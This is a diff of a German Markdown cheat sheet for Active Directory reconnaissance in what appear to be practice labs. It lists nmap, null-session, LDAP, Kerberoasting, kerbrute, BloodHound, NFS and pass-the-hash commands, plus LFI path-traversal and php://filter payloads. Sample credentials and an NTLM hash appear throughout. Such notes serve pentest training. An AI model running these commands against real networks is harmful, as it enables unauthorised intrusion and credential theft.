@@ -1,4 +1,4 @@
-## Reconnaissance & Discovery ##
+# Reconnaissance
 
 ## Ziel der Reconnaissance-Phase
 
@@ -22,7 +22,7 @@ nmap -sn 192.168.xx.x/24
 nmap --script=smb2-security-mode.nse -p 445 192.168.xx.x/24 -Pn
 
 # Umfassender Scan mit allen AD-relevanten Ports
-sudo nmap -sC -sV 192.168.xx.x/24 -p 445,139,88,389,636,80,443,22,3389 --open
+sudo nmap -sC -sV 10.10.175.0/24 -p 445,139,88,389,636,80,443,22,3389 --open
 ```
 
 ### Kritische Ports
@@ -61,7 +61,7 @@ sudo nmap --script=smb2-security-mode.nse -p 445 192.168.xx.x/24 -Pn
 smbclient -L //192.168.xx.x -N
 
 # Null Session
-rpcclient -U "" -N 192.168.xx.x
+rpcclient -U "" -N 10.10.255.70
 ```
 
 ### SMB Share Enumeration mit Credentials
@@ -69,7 +69,7 @@ rpcclient -U "" -N 192.168.xx.x
 
 ```bash
 # Share-Auflistung
-smbclient -L //192.168.xx.x -U "DC\mmustermann%Password1"
+smbclient -L //192.168.xx.x -U "MARVEL\mmustermann%Password1"
 
 # CrackMapExec Share-Scan
 crackmapexec smb 192.168.xx.x/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares
@@ -84,13 +84,13 @@ crackmapexec smb 192.168.xx.x/24 -u administrator -H aad3b435b51404eeaad3b435b51
 
 ```bash
 # Naming Contexts ermitteln
-ldapsearch -H ldap://192.168.xx.x -x -s base namingcontexts
+ldapsearch -H ldap://10.10.255.70 -x -s base namingcontexts
 
 # User-Enumeration
-ldapsearch -H ldap://192.168.xx.x -x -b "DC=lab,DC=trusted,DC=vl" "(objectClass=user)" sAMAccountName
+ldapsearch -H ldap://10.10.255.70 -x -b "DC=lab,DC=trusted,DC=vl" "(objectClass=user)" sAMAccountName
 
 # Manuelle LDAP-Bindung testen
-ldapsearch -x -H ldap:/192.168.xx.x -D "DC\mmustermann" -w Password1 -b "DC=trusted,DC=local"
+ldapsearch -x -H ldap://192.168.xx.x -D "MARVEL\mmustermann" -w Password1 -b "DC=MARVEL,DC=local"
 ```
 
 ### ldapdomaindump (mit Credentials)
@@ -98,10 +98,10 @@ ldapsearch -x -H ldap:/192.168.xx.x -D "DC\mmustermann" -w Password1 -b "DC=trus
 
 ```bash
 # Umfassender LDAP-Dump mit Authentifizierung
-sudo ldapdomaindump ldaps://192.168.xx.x -u 'DC\mmustermann' -p Password1
+sudo ldapdomaindump ldaps://192.168.xx.x -u 'MARVEL\mmustermann' -p Password1
 
 # Alternative ohne SSL
-sudo ldapdomaindump ldap://192.168.xx.x -u 'DC\mmustermann' -p Password1
+sudo ldapdomaindump ldap://192.168.xx.x -u 'MARVEL\mmustermann' -p Password1
 ```
 
 **Generierte Dateien:**
@@ -121,7 +121,7 @@ sudo ldapdomaindump ldap://192.168.xx.x -u 'DC\mmustermann' -p Password1
 
 ```bash
 # Benutzer-Enumeration über Kerberos Pre-Auth
-kerbrute userenum --dc 192.168.xx.x -d lab.trusted.vl /usr/share/seclists/Usernames/Names/names.txt
+kerbrute userenum --dc 10.10.255.70 -d lab.trusted.vl /usr/share/seclists/Usernames/Names/names.txt
 ```
 
 ### Kerberoasting (SPN Enumeration)
@@ -129,7 +129,7 @@ kerbrute userenum --dc 192.168.xx.x -d lab.trusted.vl /usr/share/seclists/Userna
 
 ```bash
 # Service Principal Names abfragen und TGS-Tickets anfordern
-impacket-GetUserSPNs DC.local/mmustermann:Password1 -dc-ip 192.168.xx.x -request
+impacket-GetUserSPNs MARVEL.local/mmustermann:Password1 -dc-ip 192.168.xx.x -request
 ```
 
 **Prozess:**
@@ -147,7 +147,7 @@ impacket-GetUserSPNs DC.local/mmustermann:Password1 -dc-ip 192.168.xx.x -request
 
 ```bash
 # Verfügbare NFS-Exports prüfen
-showmount -e 192.168.xx.x
+showmount -e 10.10.175.182
 ```
 
 ### NFS Mount
@@ -156,7 +156,7 @@ showmount -e 192.168.xx.x
 ```bash
 # NFS-Share mounten
 sudo mkdir -p /tmp/mount
-sudo mount -t nfs -o vers=3,nolock 192.168.xx.x:/opt/share /tmp/mount
+sudo mount -t nfs -o vers=3,nolock 10.10.175.182:/opt/share /tmp/mount
 
 # Inhalt prüfen
 ls -la /tmp/mount
@@ -184,13 +184,13 @@ sudo neo4j console
 
 ```bash
 # Alle Daten sammeln
-sudo bloodhound-python -d DC.local -u mmustermann -p Password1 -ns 192.168.xx.x -c all
+sudo bloodhound-python -d MARVEL.local -u mmustermann -p Password1 -ns 192.168.xx.x -c all
 
 # Nur Domain Controller
-sudo bloodhound-python -d DC.local -u mmustermann -p Password1 -ns 192.168.xx.x -c DCOnly
+sudo bloodhound-python -d MARVEL.local -u mmustermann -p Password1 -ns 192.168.xx.x -c DCOnly
 
 # Spezifische Sammlungen
-sudo bloodhound-python -d DC.local -u mmustermann -p Password1 -ns 192.168.xx.x -c Group,LocalAdmin
+sudo bloodhound-python -d MARVEL.local -u mmustermann -p Password1 -ns 192.168.xx.x -c Group,LocalAdmin
 ```
 
 ### BloodHound GUI starten
@@ -212,6 +212,7 @@ sudo bloodhound
 
 ### PowerShell Trust-Enumeration
 
+powershell
 
 ```powershell
 # In Evil-WinRM oder lokalem PowerShell
@@ -223,7 +224,7 @@ Get-ADTrust -Filter *
 
 ```bash
 # Trust-Beziehungen über LDAP
-ldeep ldap -u harry -p 'haxxor@12345' -d lab.trusted.vl -s ldap://192.168.xx.x trusts
+ldeep ldap -u harry -p 'haxxor@12345' -d lab.trusted.vl -s ldap://10.10.255.70 trusts
 ```
 
 ### Domain SID ermitteln
@@ -231,7 +232,7 @@ ldeep ldap -u harry -p 'haxxor@12345' -d lab.trusted.vl -s ldap://192.168.xx.x t
 
 ```bash
 # Child Domain SID
-lookupsid.py lab.trusted.vl/harry:'haxxor@12345'@192.168.xx.x
+lookupsid.py lab.trusted.vl/harry:'haxxor@12345'@10.10.255.70
 ```
 
 ---
@@ -272,10 +273,10 @@ python3 zerologon_tester.py ODIN-DC 192.168.xx.x
 
 ```bash
 # ffuf
-ffuf -u http://192.168.xx.x/dev/FUZZ -w /usr/share/wordlists/dirb/common.txt
+ffuf -u http://10.10.255.70/dev/FUZZ -w /usr/share/wordlists/dirb/common.txt
 
 # dirbuster
-dirbuster -u http://192.168.xx.x/ -l /usr/share/wordlists/dirb/common.txt
+dirbuster -u http://10.10.255.70/ -l /usr/share/wordlists/dirb/common.txt
 ```
 
 ### LFI Testing
@@ -283,10 +284,10 @@ dirbuster -u http://192.168.xx.x/ -l /usr/share/wordlists/dirb/common.txt
 
 ```bash
 # Windows ini-Dateien testen
-curl "http://192.168.xx.x/dev/index.html?view=../../../../Windows/win.ini"
+curl "http://10.10.255.70/dev/index.html?view=../../../../Windows/win.ini"
 
 # PHP Filter für Source Code
-curl "http://192.168.xx.x/dev/index.html?view=php://filter/convert.base64-encode/resource=index.html"
+curl "http://10.10.255.70/dev/index.html?view=php://filter/convert.base64-encode/resource=index.html"
 ```
 
 ---
@@ -298,11 +299,11 @@ curl "http://192.168.xx.x/dev/index.html?view=php://filter/convert.base64-encode
 
 ```bash
 # Single Entry
-echo "192.168.xx.x mail01.hybrid.vl" | sudo tee -a /etc/hosts
+echo "10.10.175.182 mail01.hybrid.vl" | sudo tee -a /etc/hosts
 
 # Multiple Entries (kritisch für Trust-Attacks)
-echo "192.168.xx.x lab.trusted.vl labdc.lab.trusted.vl" | sudo tee -a /etc/hosts
-echo "192.168.xx.x trusted.vl trusteddc.trusted.vl" | sudo tee -a /etc/hosts
+echo "10.10.255.70 lab.trusted.vl labdc.lab.trusted.vl" | sudo tee -a /etc/hosts
+echo "10.10.255.69 trusted.vl trusteddc.trusted.vl" | sudo tee -a /etc/hosts
 ```
 
 ---
@@ -348,8 +349,9 @@ echo "192.168.xx.x trusted.vl trusteddc.trusted.vl" | sudo tee -a /etc/hosts
 
 ## Reconnaissance Workflow
 
-### Phase 1: Netzwerk-Discovery (0-15 min)
+### Phase 1: Netzwerk-Discovery
 
+bash
 
 ```bash
 # 1. Host-Discovery
@@ -363,7 +365,7 @@ echo "192.168.xx.x" > targets.txt
 echo "192.168.xx.x" >> targets.txt
 ```
 
-### Phase 2: Service-Enumeration (15-30 min)
+### Phase 2: Service-Enumeration
 
 
 ```bash
@@ -371,7 +373,7 @@ echo "192.168.xx.x" >> targets.txt
 ldapsearch -H ldap://192.168.xx.x -x -s base namingcontexts
 
 # 2. Kerbrute User-Enum (optional, ohne Creds)
-kerbrute userenum --dc 192.168.xx.x -d ODIN.local /usr/share/seclists/Usernames/Names/names.txt
+kerbrute userenum --dc 192.168.xx.x -d MARVEL.local /usr/share/seclists/Usernames/Names/names.txt
 
 # 3. PrintNightmare Check
 impacket-rpcdump @192.168.xx.x | egrep 'MS-RPRN|MS-PAR'
@@ -382,12 +384,12 @@ impacket-rpcdump @192.168.xx.x | egrep 'MS-RPRN|MS-PAR'
 
 ```bash
 # 1. LDAP Domain Dump
-sudo ldapdomaindump ldaps://192.168.xx.x -u 'DC\mmustermann' -p Password1
+sudo ldapdomaindump ldaps://192.168.xx.x -u 'MARVEL\mmustermann' -p Password1
 
 # 2. BloodHound Collection
-sudo bloodhound-python -d DC.local -u mmustermann -p Password1 -ns 192.168.xx.x -c all
+sudo bloodhound-python -d MARVEL.local -u mmustermann -p Password1 -ns 192.168.xx.x -c all
 
 # 3. Kerberoasting
-impacket-GetUserSPNs DC.local/mmustermann:Password1 -dc-ip 192.168.xx.x -request
+impacket-GetUserSPNs MARVEL.local/mmustermann:Password1 -dc-ip 192.168.xx.x -request
 ```
 
